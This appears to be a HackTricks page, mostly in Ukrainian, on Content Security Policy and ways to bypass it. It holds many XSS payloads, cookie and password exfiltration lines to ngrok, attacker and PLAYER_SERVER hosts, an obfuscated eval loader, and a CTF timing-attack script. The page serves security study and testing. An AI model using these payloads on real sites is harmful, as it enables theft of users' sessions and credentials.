# Content Security Policy (CSP) Bypass

{{#include ../../banners/hacktricks-training.md}}

## Що таке CSP

Content Security Policy (CSP) визнається браузерною технологією, яка в першу чергу спрямована на **захист від атак, таких як cross-site scripting (XSS)**. Вона функціонує шляхом визначення і опису шляхів та джерел, з яких браузер може безпечно завантажувати ресурси. Ці ресурси охоплюють різноманітні елементи, такі як зображення, фрейми та JavaScript. Наприклад, політика може дозволяти завантаження та виконання ресурсів з того ж домену (self), включно з inline-ресурсами та виконанням рядкового коду через функції на кшталт `eval`, `setTimeout` або `setInterval`.

Реалізація CSP здійснюється через **заголовки відповіді** або шляхом включення **meta-елементів у HTML-сторінку**. Дотримуючись цієї політики, браузери активно застосовують її вимоги та негайно блокують будь-які виявлені порушення.

- Реалізовано через заголовок відповіді:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
- Реалізовано через мета-тег:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Заголовки

CSP можна застосовувати або відстежувати за допомогою цих заголовків:

- `Content-Security-Policy`: Застосовує CSP; браузер блокує будь-які порушення.
- `Content-Security-Policy-Report-Only`: Використовується для відстеження; повідомляє про порушення, не блокуючи їх. Ідеально для тестування у передвиробничих середовищах.

### Визначення ресурсів

CSP обмежує джерела завантаження як активного, так і пасивного контенту, контролюючи такі аспекти, як виконання вбудованого JavaScript та використання `eval()`. Приклад політики є:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Директиви

- **script-src**: Дозволяє конкретні джерела для JavaScript, включно з URL, inline-скриптами та скриптами, що запускаються обробниками подій або XSLT-стилями.
- **default-src**: Встановлює політику за замовчуванням для отримання ресурсів, коли відсутні конкретні директиви завантаження.
- **child-src**: Визначає дозволені джерела для web workers і вбудованого вмісту фреймів.
- **connect-src**: Обмежує URL, які можна завантажувати через інтерфейси на кшталт fetch, WebSocket, XMLHttpRequest.
- **frame-src**: Обмежує URL для фреймів.
- **frame-ancestors**: Вказує, які джерела можуть вбудовувати поточну сторінку; застосовується до елементів, таких як `<frame>`, `<iframe>`, `<object>`, `<embed>`, і `<applet>`.
- **img-src**: Визначає дозволені джерела для зображень.
- **font-src**: Визначає допустимі джерела для шрифтів, завантажуваних за допомогою `@font-face`.
- **manifest-src**: Визначає дозволені джерела файлів manifest додатків.
- **media-src**: Визначає дозволені джерела для завантаження медіа-об'єктів.
- **object-src**: Визначає дозволені джерела для елементів `<object>`, `<embed>`, і `<applet>`.
- **base-uri**: Вказує дозволені URL для завантаження з використанням елементів `<base>`.
- **form-action**: Перелічує дозволені кінцеві точки для відправки форм.
- **plugin-types**: Обмежує mime-типи, які сторінка може викликати.
- **upgrade-insecure-requests**: Підказує браузерам переписувати HTTP URL на HTTPS.
- **sandbox**: Застосовує обмеження, подібні до атрибута sandbox у `<iframe>`.
- **report-to**: Вказує групу, куди надсилатиметься звіт у разі порушення політики.
- **worker-src**: Визначає допустимі джерела для скриптів Worker, SharedWorker або ServiceWorker.
- **prefetch-src**: Визначає допустимі джерела для ресурсів, які будуть завантажені або попередньо завантажені.
- **navigate-to**: Обмежує URL, до яких документ може переміститись будь-яким способом (a, form, window.location, window.open тощо).

### Джерела

- `*`: Дозволяє всі URL, окрім тих зі схемами `data:`, `blob:`, `filesystem:`.
- `'self'`: Дозволяє завантаження з того ж домену.
- `'data'`: Дозволяє завантажувати ресурси через схему data (наприклад, зображення в Base64).
- `'none'`: Блокує завантаження з будь-якого джерела.
- `'unsafe-eval'`: Дозволяє використання `eval()` та подібних методів, не рекомендовано з міркувань безпеки.
- `'unsafe-hashes'`: Дозволяє певні inline-обробники подій.
- `'unsafe-inline'`: Дозволяє використання inline-ресурсів, як-от inline `<script>` або `<style>`, не рекомендовано з міркувань безпеки.
- `'nonce'`: Білий список для конкретних inline-скриптів, що використовують криптографічний nonce (число, використане один раз).
- If you have JS limited execution it's possible to get a used nonce inside the page with `doc.defaultView.top.document.querySelector("[nonce]")` and then reuse it to load a malicious script (if strict-dynamic is used, any allowed source can load new sources so this isn't needed), like in:

<details>

<summary>Завантажити скрипт, повторно використовуючи nonce</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
</details>

- `'sha256-<hash>'`: Дозволяє скрипти з конкретним sha256-хешем.
- `'strict-dynamic'`: Дозволяє завантаження скриптів з будь-якого джерела, якщо вони були додані до білого списку через nonce або hash.
- `'host'`: Вказує конкретний хост, наприклад `example.com`.
- `https:`: Обмежує URL-адреси до тих, що використовують HTTPS.
- `blob:`: Дозволяє завантаження ресурсів з Blob URL-адрес (наприклад, Blob URL, створені через JavaScript).
- `filesystem:`: Дозволяє завантаження ресурсів з файлової системи.
- `'report-sample'`: Включає зразок порушеного коду у звіт про порушення (корисно для налагодження).
- `'strict-origin'`: Схожий на 'self', але гарантує, що рівень безпеки протоколу джерел відповідає документу (тільки безпечні origin можуть завантажувати ресурси з безпечних origin).
- `'strict-origin-when-cross-origin'`: Надсилає повні URL при same-origin запитах, але надсилає лише origin при cross-origin запитах.
- `'unsafe-allow-redirects'`: Дозволяє завантаження ресурсів, які негайно перенаправляють на інший ресурс. Не рекомендовано, оскільки послаблює безпеку.

## Небезпечні правила CSP

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Робочий payload: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' через Iframes


{{#ref}}
csp-bypass-self-+-unsafe-inline-with-iframes.md
{{#endref}}

### 'unsafe-eval'

> [!CAUTION]
> Це не працює, для отримання додаткової інформації [**check this**](https://github.com/HackTricks-wiki/hacktricks/issues/653).
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Робочий payload:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Якщо ви якимось чином зможете змусити **дозволений JS-код створити новий script tag** у DOM (тобто створений дозволеним скриптом), то **новий script tag буде дозволено виконуватися**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Робочий payload:
```html
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Відсутність object-src і default-src

> [!CAUTION] > **Здається, це більше не працює**
```yaml
Content-Security-Policy: script-src 'self' ;
```
Робочі payloads:
```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### Завантаження файлу + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Якщо ви можете завантажити файл JS, ви можете обійти цей CSP:

Working payload:
```html
"/>'><script src="/uploads/picture.png.js"></script>
```
Втім, дуже ймовірно, що сервер **перевіряє завантажений файл** і дозволяє завантажувати лише **файли певного типу**.

Більше того, навіть якщо ви зможете завантажити **JS code inside** у файл з розширенням, яке приймає сервер (наприклад: _script.png_), цього буде недостатньо, оскільки деякі сервери, такі як apache, **select MIME type of the file based on the extension**, а браузери на кшталт Chrome **reject to execute Javascript** код всередині того, що має бути зображенням. "Hopefully", трапляються помилки. Наприклад, на CTF я дізнався, що **Apache doesn't know** розширення _**.wave**_, тому він не віддає його з **MIME type like audio/***.

У такому випадку, якщо ви знайдете XSS і функцію завантаження файлів, і вам вдасться знайти **misinterpreted extension**, ви можете спробувати завантажити файл з тим розширенням і вмістом скрипта. Або, якщо сервер перевіряє коректність формату завантаженого файлу, створіть polyglot ([some polyglot examples here](https://github.com/Polydet/polyglot-database)).

### Form-action

Якщо впровадити JS неможливо, ви все одно можете спробувати ексфільтрувати, наприклад, облікові дані, **injecting a form action** (і можливо сподіваючись, що password managers автоматично підставлять паролі). Ви можете знайти an [**example in this report**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). Також зауважте, що `default-src` не покриває form actions.

### Third Party Endpoints + ('unsafe-eval')

> [!WARNING]
> Для деяких із наведених payload **`unsafe-eval` навіть не потрібен**.
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Завантажити вразливу версію angular і виконати довільний JS:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads using Angular + бібліотека з функціями, що повертають об'єкт `window` ([check out this post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

> [!TIP]
> У пості показано, що ви можете **завантажити** всі **бібліотеки** з `cdn.cloudflare.com` (або будь-якого іншого дозволеного репозиторію JS бібліотек), виконати всі додані функції з кожної бібліотеки та перевірити **які функції з яких бібліотек повертають об'єкт `window`**.
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
Angular XSS із імені класу:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### Зловживання google recaptcha JS code

Згідно з [**this CTF writeup**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=es&_x_tr_pto=wapp#noteninja-3-solves) ви можете зловживати [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) всередині CSP, щоб виконувати довільний JS code, обходячи CSP:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
Детальніше [**payloads from this writeup**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):
```html
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>

<!-- Trigger alert -->
<img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert(1)" />

<!-- Reuse nonce -->
<img
src="x"
ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)' />
```
#### Зловживання www.google.com для open redirect

Наступний URL перенаправляє на example.com (з [here](https://www.landh.tech/blog/20240304-google-hack-50000/)):
```
https://www.google.com/amp/s/example.com/
```
Abusing \*.google.com/script.google.com

Можна зловживати Google Apps Script, щоб отримувати інформацію на сторінці всередині script.google.com. Як це було [зроблено в цьому звіті](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/).

### Third Party Endpoints + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Сценарії, як цей, коли `script-src` встановлено на `self` і певний домен whitelisted, можна обійти за допомогою JSONP. JSONP endpoints дозволяють небезпечні callback-методи, які дозволяють атакуючому виконати XSS, робочий payload:
```html
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```

```html
<script type="text/javascript" crossorigin="anonymous" src="https://accounts.google.com/o/oauth2/revoke?callback=eval(atob(%27KGZ1bmN0aW9uKCl7CiBsZXQgdnIgPSAoKT0%2Be3dpdGgobmV3IHRvcFsnVydbJ2NvbmNhdCddKCdlYicsJ1MnLCdjZycmJidvY2snfHwncGsnLCdldCcpXSgndydbJ2NvbmNhdCddKCdzcycsJzpkZWZkZWYnLCdsaScsJ3ZlY2hhdGknLCduYycsJy4nfHwnOycsJ25ldHdvcmtkZWZjaGF0cGlwZWRlZjAyOWRlZicpWydzcGxpdCddKCdkZWYnKVsnam9pbiddKCIvIikpKShvbm1lc3NhZ2U9KGUpPT5uZXcgRnVuY3Rpb24oYXRvYihlWydkYXRhJ10pKS5jYWxsKGVbJ3RhcmdldCddKSl9O25hdmlnYXRvclsnd2ViZHJpdmVyJ118fChsb2NhdGlvblsnaHJlZiddWydtYXRjaCddKCdjaGVja291dCcpJiZ2cigpKTsKfSkoKQ%3D%3D%27));"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **містить готові до використання JSONP endpoints для CSP bypass на різних вебсайтах.**

The same vulnerability will occur if the **trusted endpoint contains an Open Redirect** because if the initial endpoint is trusted, redirects are trusted.

### Зловживання сторонніми сервісами

As described in the [following post](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), there are many third party domains, that might be allowed somewhere in the CSP, can be abused to either exfiltrate data or execute JavaScript code. Some of these third-parties are:

| Сервіс            | Дозволений домен                             | Можливості |
| ----------------- | -------------------------------------------- | ---------- |
| Facebook          | www.facebook.com, \*.facebook.com            | Exfil      |
| Hotjar            | \*.hotjar.com, ask.hotjar.io                 | Exfil      |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net            | Exec       |
| Amazon CloudFront | \*.cloudfront.net                            | Exfil, Exec|
| Amazon AWS        | \*.amazonaws.com                             | Exfil, Exec|
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | Exfil, Exec|
| Salesforce Heroku | \*.herokuapp.com                             | Exfil, Exec|
| Google Firebase   | \*.firebaseapp.com                           | Exfil, Exec|

If you find any of the allowed domains in the CSP of your target, chances are that you might be able to bypass the CSP by registering on the third-party service and, either exfiltrate data to that service or to execute code.

For example, if you find the following CSP:
```
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```
або
```
Content-Security-Policy​: connect-src www.facebook.com;​
```
Ви повинні мати можливість exfiltrate data, подібно до того, як це завжди робилося з [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). У цьому випадку дотримуйтесь загальних кроків:

1. Create a Facebook Developer account here.
2. Create a new "Facebook Login" app and select "Website".
3. Go to "Settings -> Basic" and get your "App ID"
4. На цільовому сайті, з якого ви хочете exfiltrate data, можна exfiltrate data, безпосередньо використовуючи Facebook SDK гаджет "fbq" через "customEvent" і data payload.
5. Go to your App "Event Manager" and select the application you created (зауважте, event manager може знаходитись за URL, схожим на цей: https://www.facebook.com/events_manager2/list/pixel/\[app-id]/test_events
6. Select the tab "Test Events" щоб бачити події, що відправляються вашим web site.

Потім, на victim side, ви виконуєте наступний код, щоб ініціалізувати Facebook tracking pixel, щоб вказати на app-id attacker'а у Facebook developer account і відправити custom event ось так:
```JavaScript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```
Що стосується інших семи сторонніх доменів, зазначених у попередній таблиці, існує багато інших способів їхнього зловживання. Для додаткових пояснень щодо інших зловживань сторонніми ресурсами див. раніше згаданий [blog post](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses).

### Обхід через RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Окрім згаданого перенаправлення для обходу обмежень шляхів, існує ще одна техніка під назвою Relative Path Overwrite (RPO), яку можна використовувати на деяких серверах.

Наприклад, якщо CSP дозволяє шлях `https://example.com/scripts/react/`, його можна обійти таким чином:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
The browser will ultimately load `https://example.com/scripts/angular/angular.js`.

This works because for the browser, you are loading a file named `..%2fangular%2fangular.js` located under `https://example.com/scripts/react/`, which is compliant with CSP.

∑, they will decode it, effectively requesting `https://example.com/scripts/react/../angular/angular.js`, which is equivalent to `https://example.com/scripts/angular/angular.js`.

By **exploiting this inconsistency in URL interpretation between the browser and the server, the path rules can be bypassed**.

The solution is to not treat `%2f` as `/` on the server-side, ensuring consistent interpretation between the browser and the server to avoid this issue.

Online Example:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Виконання JS в iframe


{{#ref}}
../xss-cross-site-scripting/iframes-in-xss-and-csp.md
{{#endref}}

### Відсутній **base-uri**

Якщо директива **base-uri** відсутня, ви можете зловживати цим для виконання [**dangling markup injection**](../dangling-markup-html-scriptless-injection/index.html).

Крім того, якщо **сторінка завантажує скрипт за відносним шляхом** (наприклад `<script src="/js/app.js">`) з використанням **Nonce**, ви можете зловживати **base** **tag**, щоб змусити його **load** скрипт з **your own server achieving a XSS.**\
Якщо вразлива сторінка завантажується по **httpS**, використайте httpS url у base.
```html
<base href="https://www.attacker.com/" />
```
### Події AngularJS

Специфічна політика, відома як Політика безпеки вмісту (Content Security Policy, CSP), може обмежувати JavaScript-події. Однак AngularJS вводить власні події як альтернативу. У межах події AngularJS надає спеціальний об'єкт `$event`, який посилається на нативний об'єкт події браузера. Цей об'єкт `$event` може бути використаний для обходу CSP. Зокрема, у Chrome об'єкт `$event/event` має властивість `path`, що містить масив об'єктів, задіяних у ланцюжку виконання події, при цьому об'єкт `window` завжди знаходиться в кінці. Ця структура критично важлива для sandbox escape.

Якщо передати цей масив у фільтр `orderBy`, можна ітеруватися по ньому, використовуючи останній елемент (об'єкт `window`) для виклику глобальної функції, наприклад `alert()`. Нижче наведено приклад коду, що ілюструє цей процес:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Цей фрагмент демонструє використання директиви `ng-focus` для ініціювання події, застосовуючи `$event.path|orderBy` для маніпуляції масивом `path`, та використовуючи об'єкт `window` для виконання функції `alert()`, що дозволяє отримати `document.cookie`.

**Знайдіть інші Angular bypasses на** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS і домен у білому списку
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Політика CSP, яка whitelists domains для script loading в Angular JS application, може бути обійдена через виклик callback functions та певних vulnerable classes. Більш детальну інформацію про цю техніку можна знайти у вичерпному керівництві на цьому [git repository](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22).

Working payloads:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Інші кінцеві точки JSONP для довільного виконання можна знайти [**here**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (деякі з них були видалені або виправлені)

### Обхід через перенаправлення

Що відбувається, коли CSP натрапляє на серверне перенаправлення? Якщо перенаправлення веде на інший origin, який не дозволений, воно все одно зазнає невдачі.

Однак, згідно з описом у [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), якщо перенаправлення веде на інший path, воно може обійти початкові обмеження.

Ось приклад:
```html
<!DOCTYPE html>
<html>
<head>
<meta
http-equiv="Content-Security-Policy"
content="script-src http://localhost:5555 https://www.google.com/a/b/c/d" />
</head>
<body>
<div id="userContent">
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
Якщо CSP встановлено на `https://www.google.com/a/b/c/d`, оскільки враховується шлях, обидва скрипти `/test` та `/a/test` будуть заблоковані CSP.

Однак кінцевий `http://localhost:5555/301` буде **перенаправлено на стороні сервера на `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. Оскільки це редирект, **шлях не враховується**, і **скрипт може бути завантажений**, таким чином обходячи обмеження шляху.

При такому перенаправленні, навіть якщо шлях вказано повністю, його все одно буде обійдено.

Тому найкраще рішення — переконатися, що на сайті немає вразливостей типу open redirect і що в правилах CSP немає доменів, які можна експлуатувати.

### Обійти CSP за допомогою dangling markup

Детальніше читайте [тут](../dangling-markup-html-scriptless-injection/index.html).

### 'unsafe-inline'; img-src \*; via XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` означає, що ви можете виконувати будь-який скрипт у коді (XSS може виконувати код), а `img-src *` означає, що на сторінці можна використовувати будь-яке зображення з будь-якого ресурсу.

Ви можете обійти цей CSP шляхом ексфільтрації даних через зображення (у цьому випадку XSS зловживає CSRF, де сторінка, доступна боту, містить SQLi, і витягує flag через зображення):
```javascript
<script>
fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new
Image().src='http://PLAYER_SERVER/?'+_)
</script>
```
Джерело: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

Ви також можете зловживати цією конфігурацією, щоб **завантажити javascript-код, вставлений всередину зображення**. Якщо, наприклад, сторінка дозволяє завантажувати зображення з Twitter. Ви можете **створити** **спеціальне зображення**, **завантажити** його в Twitter і зловживати «**unsafe-inline**», щоб **виконати** JS-код (як звичайний XSS), який **завантажить** зображення, **витягне** з нього JS і **виконає** його: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### За допомогою Service Workers

Функція **`importScripts`** у Service workers не обмежується CSP:


{{#ref}}
../xss-cross-site-scripting/abusing-service-workers.md
{{#endref}}

### Policy Injection

**Дослідження:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Якщо **параметр**, надісланий вами, **вставляється всередину** **оголошення** **політики**, то ви можете **змінити** **політику** таким чином, що вона стане **марною**. Ви можете **дозволити script 'unsafe-inline'** за допомогою будь-якого з цих обхідних шляхів:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Тому що ця директива **перезапише існуючі директиви script-src**.\
Приклад можна знайти тут: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

В Edge це набагато простіше. Якщо ви можете додати в CSP просто це: **`;_`** **Edge** **видалить** всю **політику**.\
Example: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](<http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&y=%3Cscript%3Ealert(1)%3C/script%3E>)

### img-src \*; via XSS (iframe) - Time attack

Зверніть увагу на відсутність директиви `'unsafe-inline'`\
Цього разу ви можете змусити жертву **завантажити** сторінку під **вашим контролем** через **XSS** з використанням `<iframe`. Цього разу ви змусите жертву звернутися до сторінки, звідки ви хочете витягти інформацію (**CSRF**). Ви не можете отримати доступ до вмісту сторінки, але якщо якимось чином ви зможете **контролювати час завантаження сторінки**, то зможете витягти потрібну інформацію.

Цього разу буде витягнуто **flag**: коли **char правильно вгадується** через SQLi, **відповідь** займає **більше часу** через функцію sleep. Тоді ви зможете витягти flag:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name="f" id="g"></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org"
function gen(x) {
x = escape(x.replace(/_/g, "\\_"))
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`
}

function gen2(x) {
x = escape(x)
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`
}

async function query(word, end = false) {
let h = performance.now()
f.location = end ? gen2(word) : gen(word)
await new Promise((r) => {
g.onload = r
})
let diff = performance.now() - h
return diff > 300
}

let alphabet = "_abcdefghijklmnopqrstuvwxyz0123456789".split("")
let postfix = "}"

async function run() {
let prefix = "nn9ed{"
while (true) {
let i = 0
for (i; i < alphabet.length; i++) {
let c = alphabet[i]
let t = await query(prefix + c) // Check what chars returns TRUE or FALSE
console.log(prefix, c, t)
if (t) {
console.log("FOUND!")
prefix += c
break
}
}
if (i == alphabet.length) {
console.log("missing chars")
break
}
let t = await query(prefix + "}", true)
if (t) {
prefix += "}"
break
}
}
new Image().src = "http://PLAYER_SERVER/?" + prefix //Exfiltrate the flag
console.log(prefix)
}

run()
</script>
```
### Через Bookmarklets

Ця атака передбачає соціальну інженерію, коли нападник **переконує користувача перетягнути посилання на bookmarklet у браузері**. Цей bookmarklet міститиме **шкідливий javascript** код, який при перетягуванні або натисканні виконається в контексті поточного вікна веб-переглядача, **обминаючи CSP і дозволяючи викрасти конфіденційну інформацію** таку як cookies або tokens.

For more information [**check the original report here**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### CSP bypass шляхом обмеження CSP

In [**this CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), CSP is bypassed by injecting inside an allowed iframe a more restrictive CSP that disallowed to load a specific JS file that, then, via **prototype pollution** or **dom clobbering** allowed to **abuse a different script to load an arbitrary script**.

Ви можете **обмежити CSP у Iframe** за допомогою атрибуту **`csp`**:
```html
<iframe
src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]"
csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
In [**this CTF writeup**](https://github.com/aszx87410/ctf-writeups/issues/48), за допомогою **HTML injection** було можливим ще більше **обмежити** **CSP**, через що скрипт, що запобігає CSTI, був відключений і тому **vulnerability became exploitable.**\
**CSP** можна зробити більш суворим за допомогою **HTML meta tags**, а inline scripts можна відключити, **видаливши** відповідний **запис**, що дозволяє їх **nonce**, і **enable specific inline script via sha**:
```html
<meta
http-equiv="Content-Security-Policy"
content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';" />
```
### JS exfiltration with Content-Security-Policy-Report-Only

